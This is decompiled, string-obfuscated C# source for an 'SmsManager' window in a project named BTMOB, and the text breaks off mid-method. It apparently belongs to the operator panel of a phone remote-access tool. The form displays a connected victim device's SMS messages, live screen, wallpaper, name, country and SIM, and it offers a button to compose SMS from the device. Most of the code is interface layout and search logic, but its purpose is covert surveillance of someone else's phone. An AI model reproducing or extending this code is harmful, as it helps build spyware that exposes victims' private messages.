using System;
using System.Collections;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Drawing2D;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Windows.Forms;
using BTMOB.My.Resources;
using DrakeUI.Framework;
using Microsoft.VisualBasic.CompilerServices;

namespace BTMOB;

[DesignerGenerated]
public class SmsManager : basestyle
{
	private IContainer components;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("DGV0")]
	private DataGridView _DGV0;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("statetimer")]
	private Timer _statetimer;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("emptysearch")]
	private DrakeUIButtonIcon _emptysearch;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("searchtext")]
	private DrakeUITextBox _searchtext;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("DrakeUIButtonIcon1")]
	private DrakeUIButtonIcon _DrakeUIButtonIcon1;

	public BTClient Btcli;

	private Timer searchTimer;

	private const int WM_SETREDRAW = 11;

	[field: AccessedThroughProperty("Panel3")]
	internal virtual Panel Panel3
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	public virtual DataGridView DGV0
	{
		[CompilerGenerated]
		get
		{
			return _DGV0;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			DataGridViewCellPaintingEventHandler value2 = DataGridView1_CellPainting;
			EventHandler value3 = DGV0_SelectionChanged;
			DataGridView dataGridView = _DGV0;
			if (dataGridView != null)
			{
				dataGridView.CellPainting -= value2;
				dataGridView.SelectionChanged -= value3;
			}
			_DGV0 = value;
			dataGridView = _DGV0;
			if (dataGridView != null)
			{
				dataGridView.CellPainting += value2;
				dataGridView.SelectionChanged += value3;
			}
		}
	}

	[field: AccessedThroughProperty("Panel35")]
	internal virtual Panel Panel35
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("logtext")]
	internal virtual RichTextBox logtext
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	internal virtual Timer statetimer
	{
		[CompilerGenerated]
		get
		{
			return _statetimer;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = statetimer_Tick;
			Timer timer = _statetimer;
			if (timer != null)
			{
				timer.Tick -= value2;
			}
			_statetimer = value;
			timer = _statetimer;
			if (timer != null)
			{
				timer.Tick += value2;
			}
		}
	}

	internal virtual DrakeUIButtonIcon emptysearch
	{
		[CompilerGenerated]
		get
		{
			return _emptysearch;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = emptysearch_Click;
			DrakeUIButtonIcon drakeUIButtonIcon = _emptysearch;
			if (drakeUIButtonIcon != null)
			{
				drakeUIButtonIcon.Click -= value2;
			}
			_emptysearch = value;
			drakeUIButtonIcon = _emptysearch;
			if (drakeUIButtonIcon != null)
			{
				drakeUIButtonIcon.Click += value2;
			}
		}
	}

	internal virtual DrakeUITextBox searchtext
	{
		[CompilerGenerated]
		get
		{
			return _searchtext;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = searchtext_TextChanged;
			DrakeUITextBox drakeUITextBox = _searchtext;
			if (drakeUITextBox != null)
			{
				drakeUITextBox.TextChanged -= value2;
			}
			_searchtext = value;
			drakeUITextBox = _searchtext;
			if (drakeUITextBox != null)
			{
				drakeUITextBox.TextChanged += value2;
			}
		}
	}

	[field: AccessedThroughProperty("Panel4")]
	internal virtual Panel Panel4
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("DrakeWidth_W11")]
	internal virtual DrakeWidth_W DrakeWidth_W11
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("partclm")]
	internal virtual DataGridViewTextBoxColumn partclm
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("adresclm")]
	internal virtual DataGridViewTextBoxColumn adresclm
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("namclum")]
	internal virtual DataGridViewTextBoxColumn namclum
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("dateclum")]
	internal virtual DataGridViewTextBoxColumn dateclum
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("smspath")]
	internal virtual DataGridViewTextBoxColumn smspath
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	internal virtual DrakeUIButtonIcon DrakeUIButtonIcon1
	{
		[CompilerGenerated]
		get
		{
			return _DrakeUIButtonIcon1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = DrakeUIButtonIcon1_Click;
			DrakeUIButtonIcon drakeUIButtonIcon = _DrakeUIButtonIcon1;
			if (drakeUIButtonIcon != null)
			{
				drakeUIButtonIcon.Click -= value2;
			}
			_DrakeUIButtonIcon1 = value;
			drakeUIButtonIcon = _DrakeUIButtonIcon1;
			if (drakeUIButtonIcon != null)
			{
				drakeUIButtonIcon.Click += value2;
			}
		}
	}

	[DebuggerNonUserCode]
	protected override void Dispose(bool disposing)
	{
		try
		{
			if (disposing && components != null)
			{
				components.Dispose();
			}
		}
		finally
		{
			base.Dispose(disposing);
		}
	}

	[System.Diagnostics.DebuggerStepThrough]
	private void InitializeComponent()
	{
		this.components = new System.ComponentModel.Container();
		System.Windows.Forms.DataGridViewCellStyle dataGridViewCellStyle = new System.Windows.Forms.DataGridViewCellStyle();
		System.Windows.Forms.DataGridViewCellStyle dataGridViewCellStyle2 = new System.Windows.Forms.DataGridViewCellStyle();
		System.Windows.Forms.DataGridViewCellStyle dataGridViewCellStyle3 = new System.Windows.Forms.DataGridViewCellStyle();
		System.Windows.Forms.DataGridViewCellStyle dataGridViewCellStyle4 = new System.Windows.Forms.DataGridViewCellStyle();
		System.Windows.Forms.DataGridViewCellStyle dataGridViewCellStyle5 = new System.Windows.Forms.DataGridViewCellStyle();
		System.ComponentModel.ComponentResourceManager resources = new System.ComponentModel.ComponentResourceManager(typeof(BTMOB.SmsManager));
		this.Panel3 = new System.Windows.Forms.Panel();
		this.DGV0 = new System.Windows.Forms.DataGridView();
		this.partclm = new System.Windows.Forms.DataGridViewTextBoxColumn();
		this.adresclm = new System.Windows.Forms.DataGridViewTextBoxColumn();
		this.namclum = new System.Windows.Forms.DataGridViewTextBoxColumn();
		this.dateclum = new System.Windows.Forms.DataGridViewTextBoxColumn();
		this.smspath = new System.Windows.Forms.DataGridViewTextBoxColumn();
		this.Panel35 = new System.Windows.Forms.Panel();
		this.DrakeUIButtonIcon1 = new DrakeUI.Framework.DrakeUIButtonIcon();
		this.DrakeWidth_W11 = new DrakeUI.Framework.DrakeWidth_W();
		this.searchtext = new DrakeUI.Framework.DrakeUITextBox();
		this.emptysearch = new DrakeUI.Framework.DrakeUIButtonIcon();
		this.logtext = new System.Windows.Forms.RichTextBox();
		this.statetimer = new System.Windows.Forms.Timer(this.components);
		this.Panel4 = new System.Windows.Forms.Panel();
		((System.ComponentModel.ISupportInitialize)this.myscr).BeginInit();
		((System.ComponentModel.ISupportInitialize)this.myico).BeginInit();
		this.tobpanelsti.SuspendLayout();
		this.Panel3.SuspendLayout();
		((System.ComponentModel.ISupportInitialize)this.DGV0).BeginInit();
		this.Panel35.SuspendLayout();
		this.Panel4.SuspendLayout();
		base.SuspendLayout();
		this.pinbtn.Location = new System.Drawing.Point(819, 5);
		this.minibtn.Location = new System.Drawing.Point(861, 5);
		this.closbtn.Location = new System.Drawing.Point(903, 5);
		this.mytitle.Location = new System.Drawing.Point(5, 4);
		this.mytitle.Size = new System.Drawing.Size(935, 18);
		this.tobpanelsti.Padding = new System.Windows.Forms.Padding(5, 4, 5, 4);
		this.tobpanelsti.Size = new System.Drawing.Size(945, 26);
		this.Panel3.Controls.Add(this.DGV0);
		this.Panel3.Dock = System.Windows.Forms.DockStyle.Fill;
		this.Panel3.Location = new System.Drawing.Point(2, 105);
		this.Panel3.Name = EXGuarder._176E5438;
		this.Panel3.Padding = new System.Windows.Forms.Padding(4);
		this.Panel3.Size = new System.Drawing.Size(457, 628);
		this.Panel3.TabIndex = 40;
		this.DGV0.AllowUserToAddRows = false;
		this.DGV0.AllowUserToDeleteRows = false;
		this.DGV0.AllowUserToResizeColumns = false;
		this.DGV0.AllowUserToResizeRows = false;
		dataGridViewCellStyle.Alignment = System.Windows.Forms.DataGridViewContentAlignment.MiddleCenter;
		dataGridViewCellStyle.BackColor = System.Drawing.Color.FromArgb(45, 45, 45);
		dataGridViewCellStyle.ForeColor = System.Drawing.Color.White;
		dataGridViewCellStyle.SelectionBackColor = System.Drawing.Color.FromArgb(64, 64, 64);
		dataGridViewCellStyle.SelectionForeColor = System.Drawing.Color.White;
		dataGridViewCellStyle.WrapMode = System.Windows.Forms.DataGridViewTriState.True;
		this.DGV0.AlternatingRowsDefaultCellStyle = dataGridViewCellStyle;
		this.DGV0.AutoSizeColumnsMode = System.Windows.Forms.DataGridViewAutoSizeColumnsMode.AllCells;
		this.DGV0.AutoSizeRowsMode = System.Windows.Forms.DataGridViewAutoSizeRowsMode.AllCells;
		this.DGV0.BackgroundColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.DGV0.BorderStyle = System.Windows.Forms.BorderStyle.None;
		this.DGV0.CellBorderStyle = System.Windows.Forms.DataGridViewCellBorderStyle.None;
		this.DGV0.ClipboardCopyMode = System.Windows.Forms.DataGridViewClipboardCopyMode.Disable;
		dataGridViewCellStyle2.Alignment = System.Windows.Forms.DataGridViewContentAlignment.MiddleCenter;
		dataGridViewCellStyle2.BackColor = System.Drawing.Color.FromArgb(45, 45, 45);
		dataGridViewCellStyle2.Font = new System.Drawing.Font(EXGuarder._4C6C476B, 9f);
		dataGridViewCellStyle2.ForeColor = System.Drawing.Color.White;
		dataGridViewCellStyle2.SelectionBackColor = System.Drawing.Color.FromArgb(64, 64, 64);
		dataGridViewCellStyle2.SelectionForeColor = System.Drawing.Color.White;
		dataGridViewCellStyle2.WrapMode = System.Windows.Forms.DataGridViewTriState.True;
		this.DGV0.ColumnHeadersDefaultCellStyle = dataGridViewCellStyle2;
		this.DGV0.ColumnHeadersHeightSizeMode = System.Windows.Forms.DataGridViewColumnHeadersHeightSizeMode.AutoSize;
		this.DGV0.ColumnHeadersVisible = false;
		this.DGV0.Columns.AddRange(this.partclm, this.adresclm, this.namclum, this.dateclum, this.smspath);
		dataGridViewCellStyle3.Alignment = System.Windows.Forms.DataGridViewContentAlignment.MiddleCenter;
		dataGridViewCellStyle3.BackColor = System.Drawing.Color.FromArgb(45, 45, 45);
		dataGridViewCellStyle3.Font = new System.Drawing.Font(EXGuarder._4C6C476B, 9f);
		dataGridViewCellStyle3.ForeColor = System.Drawing.Color.White;
		dataGridViewCellStyle3.SelectionBackColor = System.Drawing.Color.FromArgb(64, 64, 64);
		dataGridViewCellStyle3.SelectionForeColor = System.Drawing.Color.White;
		dataGridViewCellStyle3.WrapMode = System.Windows.Forms.DataGridViewTriState.True;
		this.DGV0.DefaultCellStyle = dataGridViewCellStyle3;
		this.DGV0.Dock = System.Windows.Forms.DockStyle.Fill;
		this.DGV0.EditMode = System.Windows.Forms.DataGridViewEditMode.EditProgrammatically;
		this.DGV0.EnableHeadersVisualStyles = false;
		this.DGV0.GridColor = System.Drawing.Color.FromArgb(45, 45, 45);
		this.DGV0.Location = new System.Drawing.Point(4, 4);
		this.DGV0.MultiSelect = false;
		this.DGV0.Name = EXGuarder._5D331322;
		this.DGV0.ReadOnly = true;
		this.DGV0.RowHeadersBorderStyle = System.Windows.Forms.DataGridViewHeaderBorderStyle.None;
		dataGridViewCellStyle4.Alignment = System.Windows.Forms.DataGridViewContentAlignment.MiddleCenter;
		dataGridViewCellStyle4.BackColor = System.Drawing.Color.FromArgb(45, 45, 45);
		dataGridViewCellStyle4.Font = new System.Drawing.Font(EXGuarder._4C6C476B, 9f);
		dataGridViewCellStyle4.ForeColor = System.Drawing.Color.White;
		dataGridViewCellStyle4.SelectionBackColor = System.Drawing.Color.FromArgb(64, 64, 64);
		dataGridViewCellStyle4.SelectionForeColor = System.Drawing.Color.White;
		dataGridViewCellStyle4.WrapMode = System.Windows.Forms.DataGridViewTriState.True;
		this.DGV0.RowHeadersDefaultCellStyle = dataGridViewCellStyle4;
		this.DGV0.RowHeadersVisible = false;
		this.DGV0.RowHeadersWidth = 51;
		dataGridViewCellStyle5.Alignment = System.Windows.Forms.DataGridViewContentAlignment.MiddleCenter;
		dataGridViewCellStyle5.BackColor = System.Drawing.Color.FromArgb(45, 45, 45);
		dataGridViewCellStyle5.ForeColor = System.Drawing.Color.White;
		dataGridViewCellStyle5.SelectionBackColor = System.Drawing.Color.FromArgb(64, 64, 64);
		dataGridViewCellStyle5.SelectionForeColor = System.Drawing.Color.White;
		dataGridViewCellStyle5.WrapMode = System.Windows.Forms.DataGridViewTriState.True;
		this.DGV0.RowsDefaultCellStyle = dataGridViewCellStyle5;
		this.DGV0.RowTemplate.Height = 24;
		this.DGV0.SelectionMode = System.Windows.Forms.DataGridViewSelectionMode.FullRowSelect;
		this.DGV0.Size = new System.Drawing.Size(449, 620);
		this.DGV0.TabIndex = 4;
		this.partclm.HeaderText = EXGuarder._08216222;
		this.partclm.MinimumWidth = 6;
		this.partclm.Name = EXGuarder._06110B2A;
		this.partclm.ReadOnly = true;
		this.partclm.Width = 6;
		this.adresclm.HeaderText = EXGuarder._253F5862;
		this.adresclm.MinimumWidth = 6;
		this.adresclm.Name = EXGuarder._123F032B;
		this.adresclm.ReadOnly = true;
		this.adresclm.Width = 6;
		this.namclum.HeaderText = EXGuarder._34125E76;
		this.namclum.MinimumWidth = 6;
		this.namclum.Name = EXGuarder._100C1B37;
		this.namclum.ReadOnly = true;
		this.namclum.Width = 6;
		this.dateclum.HeaderText = EXGuarder._78023104;
		this.dateclum.MinimumWidth = 6;
		this.dateclum.Name = EXGuarder._69721520;
		this.dateclum.ReadOnly = true;
		this.dateclum.Width = 6;
		this.smspath.HeaderText = EXGuarder._0956732C;
		this.smspath.MinimumWidth = 6;
		this.smspath.Name = EXGuarder._65077912;
		this.smspath.ReadOnly = true;
		this.smspath.Width = 6;
		this.Panel35.BackColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.Panel35.Controls.Add(this.DrakeUIButtonIcon1);
		this.Panel35.Controls.Add(this.DrakeWidth_W11);
		this.Panel35.Controls.Add(this.searchtext);
		this.Panel35.Controls.Add(this.emptysearch);
		this.Panel35.Dock = System.Windows.Forms.DockStyle.Top;
		this.Panel35.Location = new System.Drawing.Point(2, 64);
		this.Panel35.Name = EXGuarder._5C6D086F;
		this.Panel35.Padding = new System.Windows.Forms.Padding(9);
		this.Panel35.Size = new System.Drawing.Size(945, 41);
		this.Panel35.TabIndex = 53;
		this.DrakeUIButtonIcon1.BackColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.DrakeUIButtonIcon1.Cursor = System.Windows.Forms.Cursors.Hand;
		this.DrakeUIButtonIcon1.Dock = System.Windows.Forms.DockStyle.Left;
		this.DrakeUIButtonIcon1.FillColor = System.Drawing.Color.FromArgb(14, 22, 33);
		this.DrakeUIButtonIcon1.FillDisableColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.DrakeUIButtonIcon1.FillHoverColor = System.Drawing.Color.FromArgb(14, 22, 33);
		this.DrakeUIButtonIcon1.FillPressColor = System.Drawing.Color.FromArgb(14, 22, 33);
		this.DrakeUIButtonIcon1.FillSelectedColor = System.Drawing.Color.FromArgb(14, 22, 33);
		this.DrakeUIButtonIcon1.Font = new System.Drawing.Font(EXGuarder._4C6C476B, 10f);
		this.DrakeUIButtonIcon1.ForeColor = System.Drawing.Color.FromArgb(145, 163, 182);
		this.DrakeUIButtonIcon1.ForeHoverColor = System.Drawing.Color.FromArgb(2, 176, 117);
		this.DrakeUIButtonIcon1.ForePressColor = System.Drawing.Color.FromArgb(2, 176, 117);
		this.DrakeUIButtonIcon1.ForeSelectedColor = System.Drawing.Color.FromArgb(145, 163, 182);
		this.DrakeUIButtonIcon1.Location = new System.Drawing.Point(18, 9);
		this.DrakeUIButtonIcon1.Name = EXGuarder._5736694F;
		this.DrakeUIButtonIcon1.Radius = 15;
		this.DrakeUIButtonIcon1.RectColor = System.Drawing.Color.FromArgb(40, 40, 40);
		this.DrakeUIButtonIcon1.RectDisableColor = System.Drawing.Color.FromArgb(227, 242, 253);
		this.DrakeUIButtonIcon1.RectHoverColor = System.Drawing.Color.FromArgb(2, 176, 117);
		this.DrakeUIButtonIcon1.RectPressColor = System.Drawing.Color.FromArgb(2, 176, 117);
		this.DrakeUIButtonIcon1.RectSelectedColor = System.Drawing.Color.FromArgb(40, 40, 40);
		this.DrakeUIButtonIcon1.Size = new System.Drawing.Size(164, 23);
		this.DrakeUIButtonIcon1.Style = DrakeUI.Framework.UIStyle.Custom;
		this.DrakeUIButtonIcon1.Symbol = 61912;
		this.DrakeUIButtonIcon1.SymbolSize = 20;
		this.DrakeUIButtonIcon1.TabIndex = 52;
		this.DrakeUIButtonIcon1.Text = EXGuarder._56516A4F;
		this.DrakeWidth_W11.BackColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.DrakeWidth_W11.Dock = System.Windows.Forms.DockStyle.Left;
		this.DrakeWidth_W11.Location = new System.Drawing.Point(9, 9);
		this.DrakeWidth_W11.Name = EXGuarder._320C2D2D;
		this.DrakeWidth_W11.Size = new System.Drawing.Size(9, 23);
		this.DrakeWidth_W11.TabIndex = 51;
		this.searchtext.Cursor = System.Windows.Forms.Cursors.IBeam;
		this.searchtext.Dock = System.Windows.Forms.DockStyle.Right;
		this.searchtext.FillColor = System.Drawing.Color.FromArgb(14, 22, 33);
		this.searchtext.FillDisableColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.searchtext.Font = new System.Drawing.Font(EXGuarder._4C6C476B, 9f);
		this.searchtext.ForeColor = System.Drawing.Color.White;
		this.searchtext.Location = new System.Drawing.Point(660, 9);
		this.searchtext.Margin = new System.Windows.Forms.Padding(4);
		this.searchtext.Maximum = 2147483647.0;
		this.searchtext.Minimum = -2147483648.0;
		this.searchtext.Name = EXGuarder._68053F59;
		this.searchtext.Padding = new System.Windows.Forms.Padding(4);
		this.searchtext.Radius = 15;
		this.searchtext.RectColor = System.Drawing.Color.FromArgb(40, 40, 40);
		this.searchtext.RectDisableColor = System.Drawing.Color.FromArgb(227, 242, 253);
		this.searchtext.Size = new System.Drawing.Size(236, 25);
		this.searchtext.Style = DrakeUI.Framework.UIStyle.Custom;
		this.searchtext.TabIndex = 13;
		this.searchtext.TextAlignment = System.Drawing.ContentAlignment.TopCenter;
		this.searchtext.Watermark = EXGuarder._74530963;
		this.emptysearch.Cursor = System.Windows.Forms.Cursors.Hand;
		this.emptysearch.Dock = System.Windows.Forms.DockStyle.Right;
		this.emptysearch.FillColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.emptysearch.FillHoverColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.emptysearch.FillPressColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.emptysearch.FillSelectedColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.emptysearch.Font = new System.Drawing.Font(EXGuarder._4C6C476B, 9f);
		this.emptysearch.ForeHoverColor = System.Drawing.Color.Gray;
		this.emptysearch.Location = new System.Drawing.Point(896, 9);
		this.emptysearch.Name = EXGuarder._14063D51;
		this.emptysearch.RadiusSides = DrakeUI.Framework.UICornerRadiusSides.None;
		this.emptysearch.RectColor = System.Drawing.Color.Gray;
		this.emptysearch.RectDisableColor = System.Drawing.Color.FromArgb(227, 242, 253);
		this.emptysearch.RectHoverColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.emptysearch.RectPressColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.emptysearch.RectSelectedColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.emptysearch.RectSides = System.Windows.Forms.ToolStripStatusLabelBorderSides.None;
		this.emptysearch.Size = new System.Drawing.Size(40, 23);
		this.emptysearch.Style = DrakeUI.Framework.UIStyle.Custom;
		this.emptysearch.Symbol = 77;
		this.emptysearch.TabIndex = 14;
		this.emptysearch.Visible = false;
		this.logtext.BackColor = System.Drawing.Color.FromArgb(14, 22, 33);
		this.logtext.BorderStyle = System.Windows.Forms.BorderStyle.None;
		this.logtext.Dock = System.Windows.Forms.DockStyle.Fill;
		this.logtext.Font = new System.Drawing.Font(EXGuarder._4C6C476B, 9f);
		this.logtext.ForeColor = System.Drawing.SystemColors.Control;
		this.logtext.Location = new System.Drawing.Point(9, 9);
		this.logtext.Name = EXGuarder._2C13044E;
		this.logtext.ReadOnly = true;
		this.logtext.ScrollBars = System.Windows.Forms.RichTextBoxScrollBars.Vertical;
		this.logtext.Size = new System.Drawing.Size(470, 610);
		this.logtext.TabIndex = 54;
		this.logtext.Text = EXGuarder._4944141D;
		this.Panel4.BackColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.Panel4.Controls.Add(this.logtext);
		this.Panel4.Dock = System.Windows.Forms.DockStyle.Right;
		this.Panel4.Location = new System.Drawing.Point(459, 105);
		this.Panel4.Name = EXGuarder._241F595C;
		this.Panel4.Padding = new System.Windows.Forms.Padding(9);
		this.Panel4.Size = new System.Drawing.Size(488, 628);
		this.Panel4.TabIndex = 55;
		base.AutoScaleDimensions = new System.Drawing.SizeF(8f, 18f);
		base.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
		this.BackColor = System.Drawing.Color.FromArgb(6, 10, 15);
		base.ClientSize = new System.Drawing.Size(949, 735);
		base.Controls.Add(this.Panel3);
		base.Controls.Add(this.Panel4);
		base.Controls.Add(this.Panel35);
		base.Icon = (System.Drawing.Icon)resources.GetObject(EXGuarder._2B446C59);
		base.Name = EXGuarder._4C624F21;
		this.Text = EXGuarder._6A72714E;
		base.Controls.SetChildIndex(this.tobpanelsti, 0);
		base.Controls.SetChildIndex(this.Panel35, 0);
		base.Controls.SetChildIndex(this.Panel4, 0);
		base.Controls.SetChildIndex(this.Panel3, 0);
		((System.ComponentModel.ISupportInitialize)this.myscr).EndInit();
		((System.ComponentModel.ISupportInitialize)this.myico).EndInit();
		this.tobpanelsti.ResumeLayout(false);
		this.Panel3.ResumeLayout(false);
		((System.ComponentModel.ISupportInitialize)this.DGV0).EndInit();
		this.Panel35.ResumeLayout(false);
		this.Panel4.ResumeLayout(false);
		base.ResumeLayout(false);
	}

	public SmsManager()
	{
		base.Load += SmsManager_Load;
		base.FormClosing += SmsManager_FormClosing;
		InitializeComponent();
	}

	private void DataGridView1_CellPainting(object sender, DataGridViewCellPaintingEventArgs e)
	{
		DataGridView dataGridView = (DataGridView)sender;
		if (e.RowIndex < 0 || e.ColumnIndex < 0)
		{
			return;
		}
		e.Handled = true;
		e.Graphics.SmoothingMode = SmoothingMode.AntiAlias;
		Rectangle cellBounds = e.CellBounds;
		cellBounds.Inflate(0, -2);
		using (SolidBrush brush = new SolidBrush(Color.FromArgb(6, 10, 15)))
		{
			e.Graphics.FillRectangle(brush, e.CellBounds);
		}
		int radius = 15;
		GraphicsPath graphicsPath = null;
		int columnIndex = e.ColumnIndex;
		checked
		{
			int num = dataGridView.ColumnCount - 1;
			if (columnIndex == 0)
			{
				DGV0.Rows[e.RowIndex].Cells[0].Style.Padding = new Padding(0);
				graphicsPath = codes.GetRoundedRectanglePath(cellBounds, radius, roundTopLeft: true, roundTopRight: false, roundBottomRight: false);
			}
			else if (columnIndex == num)
			{
				graphicsPath = codes.GetRoundedRectanglePath(cellBounds, radius, roundTopLeft: false, roundTopRight: true, roundBottomRight: true, roundBottomLeft: false);
			}
			else
			{
				graphicsPath = new GraphicsPath();
				graphicsPath.AddRectangle(cellBounds);
			}
			Color color = default(Color);
			Color color2;
			if (dataGridView.Rows[e.RowIndex].Selected)
			{
				color = Color.FromArgb(14, 22, 33);
				color2 = Color.FromArgb(2, 176, 117);
			}
			else
			{
				Color foreColor = dataGridView.Rows[e.RowIndex].Cells[e.ColumnIndex].Style.ForeColor;
				color2 = ((!foreColor.IsEmpty) ? foreColor : Color.FromArgb(145, 163, 182));
			}
			using (SolidBrush brush2 = new SolidBrush(color))
			{
				using Pen pen = new Pen(color);
				e.Graphics.FillPath(brush2, graphicsPath);
				e.Graphics.DrawPath(pen, graphicsPath);
			}
			if (e.Value != null && e.Value is Image)
			{
				Image image = (Image)e.Value;
				Rectangle rect = new Rectangle(cellBounds.X + unchecked(checked(cellBounds.Width - image.Width) / 2), cellBounds.Y + unchecked(checked(cellBounds.Height - image.Height) / 2), image.Width, image.Height);
				e.Graphics.DrawImage(image, rect);
			}
			else
			{
				if (e.Value == null)
				{
					return;
				}
				if (e.Value is bool)
				{
					bool flag = Conversions.ToBoolean(e.Value);
					int num2 = 14;
					Rectangle rect2 = new Rectangle(cellBounds.X + unchecked(checked(cellBounds.Width - num2) / 2), cellBounds.Y + unchecked(checked(cellBounds.Height - num2) / 2), num2, num2);
					using (Pen pen2 = new Pen(color2, 2f))
					{
						e.Graphics.DrawRectangle(pen2, rect2);
					}
					if (flag)
					{
						GraphicsPath graphicsPath2 = new GraphicsPath();
						graphicsPath2.AddLines(new Point[3]
						{
							new Point(rect2.Left + 3, rect2.Top + unchecked(num2 / 2)),
							new Point(rect2.Left + unchecked(num2 / 2) - 1, rect2.Bottom - 3),
							new Point(rect2.Right - 3, rect2.Top + 3)
						});
						using Pen pen3 = new Pen(color2, 2f);
						e.Graphics.DrawPath(pen3, graphicsPath2);
					}
				}
				else
				{
					TextRenderer.DrawText(e.Graphics, e.FormattedValue.ToString(), e.CellStyle.Font, cellBounds, color2, TextFormatFlags.HorizontalCenter | TextFormatFlags.VerticalCenter | TextFormatFlags.WordBreak);
				}
			}
		}
	}

	private void DGV0_SelectionChanged(object sender, EventArgs e)
	{
		if (DGV0.SelectedRows.Count == 1)
		{
			logtext.Text = DGV0.SelectedRows[0].Tag.ToString();
		}
	}

	private void SmsManager_Load(object sender, EventArgs e)
	{
		myico.Image = Btcli.wallpaper;
		myscr.Image = Btcli.screen;
		codes.SetDoubleBuffered(DGV0);
		statetimer.Start();
	}

	private void statetimer_Tick(object sender, EventArgs e)
	{
		try
		{
			if (Btcli.isConnected)
			{
				myscr.Image = Btcli.screen;
				myico.Image = Btcli.wallpaper;
				mytitle.Text = BTConst.Messagesstr + EXGuarder._28457829 + Btcli.name + EXGuarder._28457829 + Btcli.country;
			}
			else
			{
				myico.Image = Resources.no_con;
				myscr.Image = null;
				mytitle.Text = BTConst.Messagesstr + EXGuarder._28457829 + BTConst.Disconnectedstr;
			}
		}
		catch (Exception ex)
		{
			ProjectData.SetProjectError(ex);
			Exception ex2 = ex;
			ProjectData.ClearProjectError();
		}
	}

	private void SmsManager_FormClosing(object sender, FormClosingEventArgs e)
	{
		statetimer.Stop();
	}

	private void searchtext_TextChanged(object sender, EventArgs e)
	{
		if (searchTimer == null)
		{
			searchTimer = new Timer();
			searchTimer.Tick += PerformSearch;
			searchTimer.Interval = 300;
		}
		searchTimer.Stop();
		searchTimer.Start();
	}

	private void PerformSearch(object sender, EventArgs e)
	{
		searchTimer.Stop();
		if (string.IsNullOrWhiteSpace(searchtext.Text))
		{
			emptysearch.Visible = false;
			ShowAllRows();
		}
		else
		{
			emptysearch.Visible = true;
			trysearch();
		}
	}

	[DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
	private static extern IntPtr SendMessage(IntPtr hWnd, int msg, bool wParam, int lParam);

	private void SuspendDrawing(DataGridView grid)
	{
		SendMessage(grid.Handle, 11, wParam: false, 0);
	}

	private void ResumeDrawing(DataGridView grid)
	{
		SendMessage(grid.Handle, 11, wParam: true, 0);
		grid.Refresh();
	}

	public void trysearch()
	{
		if (DGV0.Rows.Count < 1 || string.IsNullOrEmpty(searchtext.Text))
		{
			return;
		}
		SuspendDrawing(DGV0);
		string value = searchtext.Text.ToLower();
		foreach (DataGridViewRow item in (IEnumerable)DGV0.Rows)
		{
			try
			{
				if (item.Tag.ToString().ToLower().Contains(value) || item.Cells[0].Value.ToString().ToLower().Contains(value) || item.Cells[1].Value.ToString().ToLower().Contains(value) || item.Cells[2].Value.ToString().ToLower().Contains(value) || item.Cells[3].Value.ToString().ToLower().Contains(value) || item.Cells[4].Value.ToString().ToLower().Contains(value))
				{
					item.Visible = true;
				}
				else
				{
					item.Visible = false;
				}
			}
			catch (Exception ex)
			{
				ProjectData.SetProjectError(ex);
				Exception ex2 = ex;
				ProjectData.ClearProjectError();
			}
		}
		ResumeDrawing(DGV0);
	}

	private void ShowAllRows()
	{
		foreach (DataGridViewRow item in (IEnumerable)DGV0.Rows)
		{
			item.Visible = true;
		}
	}

	private void emptysearch_Click(object sender, EventArgs e)
	{
		searchtext.Text = EXGuarder._3D35182C;
	}

	private void DrakeUIButtonIcon1_Click(object sender, EventArgs e)
	{
		checked
		{
			try
			{
				SMSmaker sMSmaker = new SMSmaker();
				sMSmaker.myico.Image = Btcli.wallpaper;
				if (Btcli.sim.Contains(EXGuarder._2B57325F))
				{
